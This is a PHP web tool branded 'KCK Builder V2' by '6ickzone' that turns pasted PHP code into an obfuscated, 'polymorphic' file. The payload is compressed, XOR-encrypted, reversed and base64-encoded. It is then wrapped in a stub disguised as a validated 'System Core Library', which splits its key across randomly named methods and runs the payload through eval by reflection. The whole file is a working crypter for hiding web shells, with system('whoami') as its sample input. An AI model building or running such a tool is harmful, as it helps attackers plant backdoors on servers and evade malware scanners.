<?php
/**
 * KCK Generator v2
 * Randomize Variable/Class/Function/Names
 */
error_reporting(0);
ini_set('memory_limit', '256M'); 

$msg = "";

// --- Helper ---
function generate6zoneName($length = 16) {
    $chars = '0123456789abcdefghijklmnopqrstuvwxyz';
    $res = '';
    for ($i = 0; $i < $length; $i++) {
        $res .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $res . "6zone.php";
}

function randStr($length = 10) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $res = '';
    for ($i = 0; $i < $length; $i++) {
        $res .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $res;
}

if (isset($_POST['generate'])) {
    $raw_code = $_POST['code'];
    $file_name = !empty($_POST['filename']) ? $_POST['filename'] : generate6zoneName(20);

    $raw_code = preg_replace('/^<\?php/', '', $raw_code);
    $raw_code = preg_replace('/\?>$/', '', $raw_code);
    $raw_code = trim($raw_code);

    if (!empty($raw_code)) {
        // Encryption Logic
        $key_part = 'JNdtOotLGjdSlFDgVnDDuXBmyQTId'; 
        $step1 = gzcompress($raw_code, 9);
        $step2 = "";
        $k_len = strlen($key_part);
        for ($i = 0; $i < strlen($step1); $i++) {
            $step2 .= $step1[$i] ^ $key_part[$i % $k_len];
        }
        $step4 = strrev(bin2hex($step2));
        $final_payload = base64_encode($step4);

        // Polymorphism Signatures
        $cls_name   = "Core_".randStr(5)."_Mod";
        $func_exec  = randStr(8);
        $func_entry = "init_".randStr(4);
        $f_k1 = randStr(6); $f_k2 = randStr(6); $f_k3 = randStr(6);
        $f_i1 = randStr(6); $f_i2 = randStr(6); $f_i3 = randStr(6);
        $v_payload  = randStr(5); $v_decoded  = randStr(5);
        $v_key = randStr(5); $v_integ = randStr(5); $v_final = randStr(5);
        $c_decoy1   = "CONF_".strtoupper(randStr(6));

        $stub = '<?php
/**
 * System Core Library
 * ID: '.uniqid().'
 * Status: Validated
 * Author: 0x6ick - 6ickzone
 */
error_reporting(0);
ini_set("memory_limit", "512M");
define(\''.$c_decoy1.'\', \''.randStr(15).'\');

class '.$cls_name.' {
    private function '.$f_k1.'() { return \'JNdtOotLGj\'; }
    private function '.$f_k2.'() { return \'dSlFDgVnD\'; }
    private function '.$f_k3.'() { return \'DuXBmyQTId\'; }
    private function '.$f_i1.'() { return \'rpPjMuDSyooNdnfJxqJS\'; }
    private function '.$f_i2.'() { return \'aWZeByWUgPivEUyaJKLd\'; }
    private function '.$f_i3.'() { return \'UMruuemTGosDnBBnAslX\'; }

    private function '.$func_exec.'($c = \'\') {
        if (empty($c)) return null;
        $c = preg_replace(\'/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/\', \'\', $c);
        try { return eval(trim($c)); } catch (Throwable $e) { return null; }
    }

    public static function '.$func_entry.'() {
        $'.$v_payload.' = \'' . $final_payload . '\';
        $'.$v_decoded.' = hex2bin(strrev(base64_decode($'.$v_payload.')));
        $o = new self();
        $'.$v_key.' = $o->'.$f_k1.'() . $o->'.$f_k2.'() . $o->'.$f_k3.'();
        $'.$v_integ.' = $o->'.$f_i1.'() . $o->'.$f_i2.'() . $o->'.$f_i3.'();
        if (md5($'.$v_integ.') !== \'9bdbd9958a3da2272fc03d5cd89df03b\') { return; }
        $'.$v_final.' = \'\';
        $kl = strlen($'.$v_key.');
        for ($i=0, $len = strlen($'.$v_decoded.'); $i < $len; $i++) {
            $'.$v_final.' .= chr(ord($'.$v_decoded.'[$i]) ^ ord($'.$v_key.'[$i % $kl]));
        }
        $res = @gzuncompress($'.$v_final.');
        if ($res) {
            $ref = new ReflectionMethod(__CLASS__, \''.$func_exec.'\');
            $ref->setAccessible(true);
            $ref->invoke(new self(), $res);
        }
    }
}
if (!defined(\'_SYS_LOADED\')) {
    define(\'_SYS_LOADED\', true);
    '.$cls_name.'::'.$func_entry.'();
}
?>';

        if (file_put_contents($file_name, $stub)) {
            $msg = "<div class='alert success'>
                    <i class='fa-solid fa-check-circle'></i> <b>BUILD SUCCESS!</b><br>
                    File Name: <span class='highlight'>$file_name</span><br>
                    <small>Type: Polymorphic 6zone Engine</small>
                    </div>";
        } else {
            $msg = "<div class='alert error'><i class='fa-solid fa-triangle-exclamation'></i> Check write permissions!</div>";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>KCK Builder // 6ickzone</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #4f46e5; --success: #10b981; --border: #e5e7eb; --text: #1f2937; }
        body { font-family: 'Poppins', sans-serif; background: transparent; color: var(--text); padding: 20px; }
        .card { background: #fff; padding: 30px; border-radius: 16px; border: 1px solid var(--border); box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); max-width: 800px; margin: 0 auto; }
        h2 { font-size: 1.4rem; font-weight: 700; margin-bottom: 25px; display: flex; align-items: center; gap: 12px; border-bottom: 2px solid #f3f4f6; padding-bottom: 15px; }
        
        label { display: block; font-size: 0.8rem; font-weight: 600; color: #6b7280; margin-bottom: 8px; text-transform: uppercase; }
        textarea { width: 100%; height: 280px; background: #0f172a; color: #38bdf8; border: 1px solid #1e293b; padding: 15px; border-radius: 10px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; outline: none; box-sizing: border-box; resize: vertical; }
        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 8px; margin-bottom: 20px; outline: none; transition: 0.2s; box-sizing: border-box; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1); }
        
        .btn-gen { background: var(--primary); color: #fff; border: none; padding: 15px; border-radius: 10px; font-weight: 600; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; font-size: 0.95rem; }
        .btn-gen:hover { background: #4338ca; transform: translateY(-2px); }
        
        .alert { padding: 15px; border-radius: 10px; margin-bottom: 25px; font-size: 0.9rem; border: 1px solid transparent; }
        .success { background: #ecfdf5; color: #065f46; border-color: #a7f3d0; }
        .error { background: #fef2f2; color: #991b1b; border-color: #fecaca; }
        .highlight { color: var(--primary); font-weight: 700; font-family: monospace; }
        
        /* Spinner */
        .spinner { display: none; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <h2><i class="fa-solid fa-code-merge" style="color:var(--primary);"></i> KCK Builder V2</h2>
    
    <?php if ($msg): echo $msg; endif; ?>

    <form method="POST" onsubmit="showLoad()">
        <label>PHP Source:</label>
        <textarea name="code" placeholder="system('whoami');" required></textarea>
        
        <label style="margin-top:20px;">Output Filename:</label>
        <input type="text" name="filename" placeholder="Leave blank for 6zone auto-name">
        
        <button type="submit" name="generate" class="btn-gen" id="btnGen">
            <div class="spinner" id="loader"></div>
            <span id="btnText"><i class="fa-solid fa-bolt"></i> CONSTRUCT POLYMORPHIC ENGINE</span>
        </button>
    </form>
</div>

<script>
    function showLoad() {
        document.getElementById('loader').style.display = 'block';
        document.getElementById('btnText').innerText = 'CONSTRUCTING...';
        document.getElementById('btnGen').style.pointerEvents = 'none';
        document.getElementById('btnGen').style.opacity = '0.8';
        
        if (window.parent && window.parent.document.getElementById('loading-overlay')) {
            window.parent.document.getElementById('loading-overlay').style.display = 'flex';
        }
    }
</script>

</body>
</html>